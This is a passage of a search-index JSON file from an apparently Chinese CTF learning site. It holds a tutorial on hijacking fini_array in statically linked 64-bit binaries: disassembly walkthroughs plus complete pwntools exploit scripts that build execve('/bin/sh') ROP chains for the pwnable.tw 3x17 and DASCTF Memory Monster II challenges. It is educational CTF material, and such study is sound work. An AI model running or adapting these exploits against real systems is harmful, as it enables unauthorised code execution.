\u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002 exp from pwn import * context.log_level = 'debug' p = process(\"./main\") elf = ELF(\"./main\") #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write(addr,data): p.sendlineafter('addr:',p64(addr)) p.sendafter('data:',data) # hijack fini_array gdb.attach(p,'b *0x0402CB0') write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting #gdb.attach(p) write(fini_array,p64(leave_ret) + p64(ret)) p.interactive() \u53c2\u8003\u6587\u7ae0 \u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#64-fini_array-rop","text":"","title":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1","text":"\u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); \u6839\u636e 64 \u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c","title":"\u7a0b\u5e8f\u8d77\u70b9"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#__libc_csu_fini","text":"__libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+F\u2191o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34\u2193j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1B\u2191j .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp .text:0000000000402968 lea rbp, _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 .text:0000000000402988 call qword ptr [rbp+rbx*8+0] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] .text:0000000000402988 call qword ptr [rbp+rbx*8+0] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a .fini_array:00000000004B40F0 _fini_array segment para public 'DATA' use64 .fini_array:00000000004B40F0 assume cs:_fini_array .fini_array:00000000004B40F0 ;org 4B40F0h .fini_array:00000000004B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:000000000040291C\u2191o .fini_array:00000000004B40F0 ; __libc_csu_fini+8\u2191o .fini_array:00000000004B40F8 dq offset sub_401580 .fini_array:00000000004B40F8 _fini_array ends \u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48 \u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 \uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002","title":"__libc_csu_fini \u51fd\u6570"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#pwnabletw-3x17","text":"","title":"pwnable.tw-3x17"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_2","text":"\u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_3","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // ST08_8 char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { write_fun(1u, \"addr:\", 5uLL); read_fun(0, &buf, 0x18uLL);//\u8bfb\u53d6\u5730\u5740 v4 = (char *)(signed int)sub_40EE70((__int64)&buf); write_fun(1u, \"data:\", 5uLL); read_fun(0, v4, 0x18uLL);//\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_4","text":"\u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 fini_array \u52ab\u6301 \u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b \u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1ahttps://www.mrskye.cn/archives/168/","title":"\u601d\u8def"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#exp","text":"from pwn import * context.log_level = 'debug' #p = process(\"./317\") p = remote(\"chall.pwnable.tw\",10105) elf = process(\"./317\") fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write(addr,data): p.recv() p.send(str(addr)) p.recv() p.send(data) def exp(): # hijack fini_array #gdb.attach(p) write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(bin_sh_addr,\"/bin/sh\\x00\") write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting write(fini_array,p64(leave_ret) + p64(ret)) if __name__ == '__main__': exp() p.interactive()","title":"exp"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_5","text":"[\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#memory-monster-ii","text":"\u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b","title":"Memory Monster II"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_6","text":"checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_7","text":"\u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 .text:0000000000401B00 public start .text:0000000000401B00 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401B00 ; __unwind { .text:0000000000401B00 xor ebp, ebp .text:0000000000401B02 mov r9, rdx .text:0000000000401B05 pop rsi .text:0000000000401B06 mov rdx, rsp .text:0000000000401B09 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401B0D push rax .text:0000000000401B0E push rsp .text:0000000000401B0F mov r8, offset __libc_start_fini .text:0000000000401B16 mov rcx, offset __libc_start_init .text:0000000000401B1D mov rdi, offset main .text:0000000000401B24 db 67h .text:0000000000401B24 call sub_4020B0 .text:0000000000401B2A hlt .text:0000000000401B2A ; } // starts at 401B00 .text:0000000000401B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget \u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#exp_1","text":"from pwn import * context.log_level = 'debug' p = process(\"./main\") elf = ELF(\"./main\") #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write(addr,data): p.sendlineafter('addr:',p64(addr)) p.sendafter('data:',data) # hijack fini_array gdb.attach(p,'b *0x0402CB0') write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting #gdb.attach(p) write(fini_array,p64(leave_ret) + p64(ret)) p.interactive()","title":"exp"},{"location":"stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_8","text":"\u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"\u53c2\u8003\u6587\u7ae0"}]}